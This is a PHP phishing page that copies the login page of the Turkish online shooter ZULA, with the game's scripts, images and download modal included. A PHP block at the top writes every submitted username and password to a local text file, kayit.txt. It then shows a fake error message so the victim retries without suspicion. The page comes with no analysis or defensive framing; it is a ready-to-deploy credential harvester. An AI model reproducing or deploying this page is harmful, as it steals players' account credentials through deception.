
<?php  

if (isset($_POST['login']) && isset($_POST['password'])) {

$ac = fopen("kayit.txt","a+");
$username = $_POST['login'];
$password = $_POST['password'];
$userlar = ("\n __________________ \nUsername: ".$username."\nPassword: ".$password."\n__________________ \n");
fwrite($ac,$userlar);
fclose($ac);
echo "<script>alert('Kullanıcı Adınızı veya Şifrenizi kontrol ediniz!');</script>";
}
 ?>

<html><head>
<title>ZULA - İLK VE TEK TÜRK YAPIMI MMOFPS OYUNU</title>
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
<meta name="description" content="İlk ve tek TÜRK yapımı MMOFPS oyunu ZULA! Hemen kaydol ve ücretsiz oyna!">
<meta name="keywords" content="zula beta,kapalı beta,zula,zulaoyun,zula oyna,zula indir,zula yükle,yerli fps,yerli mmofps,türk yapımı,mmofps,türkçe oyun,ücretsiz fps,ücretsiz mmofps,fps,oyun,ücretsiz oyna,%100 türkçe,zula kayıt ol,zula üye ol,lokum games,lokum,ücretsiz oyun,zula kaydol,mafya oyunu,savaş oyunu,türk oyunu,zula kaydol">
<meta property="og:title" content="ZULA - İLK VE TEK TÜRK YAPIMI MMOFPS OYUNU">
<meta property="og:description" content="İlk ve tek TÜRK yapımı MMOFPS oyunu ZULA! Hemen kaydol ve ücretsiz oyna!">
<meta property="og:type" content="website">
<meta property="og:url" content="https://www.zulaoyun.com/">
<link rel="stylesheet" href="//cdn.zulaoyun.com/sitecdn/TR/Content/hesapzulaoyun/css/bootstrap.min.css">
<link rel="stylesheet" href="//cdn.zulaoyun.com/sitecdn/TR/Content/hesapzulaoyun/css/somestr.css">
<link rel="icon" href="//cdn.zulaoyun.com/sitecdn/TR/Content/images/favicon-v2.ico" type="image/x-icon">
<script type="text/javascript" async="" src="https://www.google-analytics.com/gtm/js?id=GTM-W7MQPRC&amp;t=gtm3&amp;cid=594728915.1557908035"></script><script src="https://connect.facebook.net/signals/plugins/inferredEvents.js?v=2.8.47" async=""></script><script src="https://connect.facebook.net/signals/config/973819402646794?v=2.8.47&amp;r=stable" async=""></script><script async="" src="https://connect.facebook.net/en_US/fbevents.js"></script><script type="text/javascript" async="" src="https://www.google-analytics.com/analytics.js"></script><script type="text/javascript" async="" src="//static.hotjar.com/c/hotjar-1268523.js?sv=5"></script><script type="text/javascript" async="" src="https://www.google-analytics.com/analytics.js"></script><script async="" src="https://www.googletagmanager.com/gtm.js?id=GTM-MJX664T"></script><script type="text/javascript" src="//cdn.zulaoyun.com/sitecdn/TR/Content/hesapzulaoyun/js/jquery-2.1.3.min.js"></script>
<script type="text/javascript" src="//cdn.zulaoyun.com/sitecdn/TR/Content/hesapzulaoyun/js/jquery.validate.js"></script>
<script type="text/javascript" src="//cdn.zulaoyun.com/sitecdn/TR/Content/hesapzulaoyun/js/jquery.validate.unobtrusive.js"></script>
<script type="text/javascript" src="//cdn.zulaoyun.com/sitecdn/TR/Content/hesapzulaoyun/js/jquery.unobtrusive-ajax.js"></script>
<script src="//cdn.zulaoyun.com/sitecdn/TR/Content/hesapzulaoyun/js/bootstrap.min.js"></script>

<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
})(window,document,'script','dataLayer','GTM-MJX664T');</script>

<style>
        #downloadModal .modal-content {
            border-radius: 3px;
        }

        #downloadModal a .img-responsive {
            box-shadow: 1px 1px 5px 1px #333;
            border-radius: 3px;
            padding: 10px;
            transition: all .3s;
        }

        #downloadModal a .img-responsive:hover {
            box-shadow: 1px 1px 15px 1px #333;
        }
    </style>
<script async="" src="https://script.hotjar.com/modules.72800337710083b01d0d.js"></script><style type="text/css">iframe#_hjRemoteVarsFrame {display: none !important; width: 1px !important; height: 1px !important; opacity: 0 !important; pointer-events: none !important;}</style></head>
<body class="login">

<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-MJX664T"
height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>

<div class="container">
<div class="slogan text-center">
<img class="img-responsive" src="//cdn.zulaoyun.com/sitecdn/TR/Content/hesapzulaoyun/images/somestr/somestrlogin-text.png">
<img class="img-responsive visible-xs" style="max-width: 50%" src="//cdn.zulaoyun.com/sitecdn/TR/Content/hesapzulaoyun/images/somestr/gifts-1.png">
</div>
<div class="login-form-wrapper">
<div class="login-form yellow" id="registerForm">
<form action="" method="post"> <h5>
GİRİŞ YAP VE HEMEN OYNAMAYA BAŞLA
</h5>
<div class="form-group bordered">
<span class="icon">
<img class="icon-user" src="//cdn.zulaoyun.com/sitecdn/TR/Content/hesapzulaoyun/images/ico-user-yellow.png">
</span>
<input name="login" placeholder="Kullanıcı Adı" type="text" value="" style="height: 30px;">
<div class="input-error"><span class="field-validation-valid" data-valmsg-for="UserName" data-valmsg-replace="true"></span></div>
</div>
<div class="form-group bordered">
<span class="icon">
<img class="icon-key" src="//cdn.zulaoyun.com/sitecdn/TR/Content/hesapzulaoyun/images/ico-key-yellow.png">
</span>
<input name="password" placeholder="Şifre" type="password" style="height: 30px;">
<div class="input-error"><span class="field-validation-valid" data-valmsg-for="Password" data-valmsg-replace="true"></span></div>
</div>
<div class="form-group">
<a href="/profil/kurtarma" class="pull-right">Kullanıcı adımı / Şifremi Unuttum</a>
</div>
<input type="submit" class="btn btn-form btn-login" value="GİRİŞ YAP">
<input name="__RequestVerificationToken" type="hidden" value="CfDJ8KhxtnNWFSNAuQMOSXV2b2sl8e01zlL-UaM56fs4eMHAHk0Fl2XQ5HBjYbGLOXHDkpbDmKKC1KsUf5v6CnOUvYUf9xPCifQgYlo1Jl1ZSef4TAJnGuQtgYv6d78AtLTfqU82yYMuLZwGUGyUDJSpa_E"></form>
</div>
</div>
<div class="footer-logos">
<img class="img-responsive" src="//cdn.zulaoyun.com/sitecdn/TR/Content/hesapzulaoyun/images/zula-logo-v2.png">
<img class="img-responsive" src="//cdn.zulaoyun.com/sitecdn/TR/Content/hesapzulaoyun/images/lokum-madbyte-logos.png">
</div>
</div>
<script>
        $(document).ready(function () {
            var loading = $('.form-block__loader');
            loading.hide();

            var utm_source = $('#utm_source').val();
            if (utm_source === 'adcash') {
                $('#txtSuccessUrl').val('/sayfalar/kayitbasariliadc');
            }

            $('.field-validation-error').html('');
        });

        $("#notification").on('change',
            function () {
                if ($(this).is(':checked')) {
                    $(this).attr('value', 'true');
                } else {
                    $(this).attr('value', 'false');
                }
            });

        $(".btn-signup").on("click",
            function (e) {
                e.preventDefault();
                var user = $('#user-input').is(':checked');
                var error = $('.agreement-text');
                var form = $('form');

                if (!user) {
                    error.show();
                } else {
                    error.hide();

                    if (form.valid()) {
                        form.submit();
                    }
                }
            });
    </script>
<style>
    #downloadModal {
    z-index: 99999999;
}

    #downloadModal .modal-header {
        padding: 0;
        padding-right: 5px;
        border: none;
    }

        #downloadModal .modal-header .close {
            font-size: 3.5rem;
            line-height: 3rem;
            color: #5a5a5a;
            text-shadow: none;
            font-weight: normal;
            opacity: 1;
        }

    #downloadModal .modal-content {
        border-radius: 0;
        background-color: #000;
        border: 1px solid #ffb004;
    }

    #downloadModal .modal-body {
        padding: 0;
    }

    #downloadModal .download-header {
        background-color: #ffb004;
        text-align: center;
    }

        #downloadModal .download-header div {
            border-right: 1px solid #000;
            padding: 25px 0;
        }

            #downloadModal .download-header div:last-child {
                border: none;
            }

        #downloadModal .download-header img {
            display: block;
            margin: 0 auto;
        }

.download-content {
    padding: 0 15px;
    color: #fff;
    margin-top: 15px;
}

    .download-content table th, table td {
        padding: 10px 0;
        font-weight: normal;
        border-color: #ffb004;
    }

    .download-content table th {
        border: none;
        color: #ffb004;
    }

    .download-content table td {
        border-color: #ffb004;
        font-family: 'Arial', sans-serif;
    }
</style>
<div class="modal fade" id="downloadModal" tabindex="-1" role="dialog" aria-labelledby="downloadModalLabel" aria-hidden="true">
<div class="modal-dialog modal-lg" role="document">
<div class="modal-content">
<div class="modal-header">
<button type="button" class="close" data-dismiss="modal" aria-label="Close">
<span aria-hidden="true">×</span>
</button>
</div>
<div class="modal-body">
<div class="download-header">
<div class="row">
<div class="col-md-12 text-center">
<a href="http://cdn.zulaoyun.com/misc/zulasetup.exe?t=111ba4b0-5dc2-4fb2-ad15-f8ab11ae67fa" target="_blank" rel="noopener"><img class="img-responsive" src="//cdn.zulaoyun.com/sitecdn/TR/Content/hesapzulaoyun/images/download-download.png"></a>
</div>
</div>
</div>
<div class="download-content table-responsive">
<table class="table">
<thead>
<tr>
<th></th>
<th>MİNİMUM SİSTEM GEREKSİNİMLERİ</th>
<th>ÖNERİLEN SİSTEM GEREKSİNİMLERİ</th>
</tr>
</thead>
<tbody>
<tr>
<td>İŞLETİM SİSTEMİ</td>
<td>Windows 7 / 8 / 10</td>
<td>Windows 7 / 8 / 10</td>
</tr>
<tr>
<td>CPU</td>
<td>Pentium 4 2.4 GHz / Athlon XP 2500+</td>
<td>Pentium 4 3.0 GHz / Athlon XP 3000+</td>
</tr>
<tr>
<td>RAM</td>
<td>2 GB</td>
<td>En az 4 GB</td>
</tr>
<tr>
<td>EKRAN KARTI</td>
<td>Graphics Intel HD</td>
<td>Graphics Intel HD 4000</td>
</tr>
<tr>
<td>SABİT DİSK</td>
<td>1 GB</td>
<td>En az 2 GB</td>
</tr>
</tbody>
</table>
</div>
</div>
</div>
</div>
</div>
<script>
        $(document).ready(function () {
            $("body").addClass("login");
            if ($(".login-form h5").text() == "Giriş Yap") {
                $(".login-form h5").text("GİRİŞ YAP");
            }
            if ($(".btn-login").val() == "Giriş Yap") {
                $(".btn-login").val("GİRİŞ YAP");
            }
            if ($(".fb-login-button").text() == "Facebook ile Giriş") {
                $(".fb-login-button").text("FACEBOOK İLE GİRİŞ");
            }
            if ($(".btn-download").text() == "Ücretsiz İndir") {
                $(".btn-download").text("ÜCRETSİZ İNDİR");
            }
        });
    </script>


<script type="text/javascript" id="">!function(b,e,f,g,a,c,d){b.fbq||(a=b.fbq=function(){a.callMethod?a.callMethod.apply(a,arguments):a.queue.push(arguments)},b._fbq||(b._fbq=a),a.push=a,a.loaded=!0,a.version="2.0",a.queue=[],c=e.createElement(f),c.async=!0,c.src=g,d=e.getElementsByTagName(f)[0],d.parentNode.insertBefore(c,d))}(window,document,"script","https://connect.facebook.net/en_US/fbevents.js");fbq("init","973819402646794");fbq("track","PageView");</script> 
<noscript>
  <img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=973819402646794&amp;ev=PageView&amp;noscript=1">
</noscript>
<iframe name="_hjRemoteVarsFrame" title="_hjRemoteVarsFrame" id="_hjRemoteVarsFrame" src="https://vars.hotjar.com/box-90f3a29ef7448451db5af955688970d7.html" style="display: none !important; width: 1px !important; height: 1px !important; opacity: 0 !important; pointer-events: none !important;"></iframe><div id="ads"></div></body></html>